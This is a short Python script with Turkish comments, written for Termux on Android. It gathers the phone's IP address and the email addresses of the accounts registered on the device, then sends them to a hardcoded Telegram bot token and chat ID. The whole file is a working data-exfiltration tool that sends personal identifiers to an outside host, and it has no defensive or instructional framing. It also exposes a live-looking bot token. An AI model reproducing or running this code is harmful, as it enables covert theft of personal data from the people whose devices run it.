import subprocess
import json
import socket
import telebot
import os
import sys

# Telegram bot token ve chat ID
TOKEN = '7587467243:AAF5-W3VkmUv4Qo_0VGQiEUCKZgTcdbUhZE'  # Telegram bot token
CHAT_ID = '7688653312'  # Telegram chat ID

# Gereken pip paketlerini yükleme
def install_requirements():
    required_packages = ['termux-python', 'pytelegrambotapi']
    for package in required_packages:
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        except subprocess.CalledProcessError:
            print(f"Error installing {package}")

# IP adresini almak için her iki yöntemi de deneyen fonksiyon
def get_ip_address():
    try:
        # 'ip addr' komutunu kullanarak IP adresini al
        ip_address = subprocess.getoutput("ip addr show wlan0 | grep inet | awk '{ print $2 }'").strip()
        if ip_address:
            return ip_address.split('/')[0]  # /mask kısmını çıkar
        else:
            raise Exception("IP adresi alınamadı.")
    except Exception as e:
        # Eğer 'ip addr' çalışmazsa, socket yöntemiyle IP adresini al
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            return ip_address
        except Exception as e:
            return f"Hata: {e}"

# Termux API ile cihazdaki hesapları alma (Alternatif çözüm gerekebilir)
def get_android_emails():
    try:
        # E-posta hesapları almak için farklı bir yöntem kullanma (Termux izin sorunları olabilir)
        result = subprocess.run(["termux-account"], capture_output=True, text=True)
        accounts = json.loads(result.stdout)
        emails = [account["name"] for account in accounts if "@" in account["name"]]
        return emails if emails else ["E-posta adresi bulunamadı."]
    except Exception as e:
        return [f"Hata: {e}"]

# Telegram'a mesaj gönderme
def send_to_telegram(message):
    try:
        bot = telebot.TeleBot(TOKEN)
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print(f"Telegram'a mesaj gönderilemedi: {e}")

# Ana fonksiyon
def main():
    # Gerekli paketleri yükle
    install_requirements()
    
    ip_address = get_ip_address()
    emails = get_android_emails()
    email_list = '\n'.join(emails)
    
    # Mesajı oluştur
    message = f"📌 **Cihaz Bilgileri**\n\n🌐 IP Adresi: {ip_address}\n📧 Kayıtlı E-postalar:\n{email_list}"
    
    print("Telegram'a gönderiliyor...")
    send_to_telegram(message)
    print("Mesaj gönderildi.")

if __name__ == "__main__":
    main()
